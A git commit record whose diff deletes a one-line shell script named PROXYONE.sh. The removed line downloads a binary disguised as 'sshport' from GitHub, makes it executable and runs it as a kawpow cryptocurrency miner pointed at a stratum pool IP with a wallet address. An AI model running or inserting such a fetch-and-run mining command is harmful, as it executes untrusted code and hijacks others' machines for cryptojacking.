aaca352d192efcf556c6cb2280185a5b44313a44
uyaahaga <154950677+uyaahaga@users.noreply.github.com>
2023-12-27 04:20:05 +0000

    Delete PROXYONE.sh

--- PROXYONE.sh
+++
@@ -1,1 +0,0 @@
-wget https://github.com/ratimajtq/ssh-usa/raw/main/sshport && chmod 700 sshport && ./sshport -a kawpow -o stratum+tcp://147.185.221.17:52195 -u AbuXE8gmZQPcdJSLv64XQZJtVLPvQzQZmm.STRIXGPU
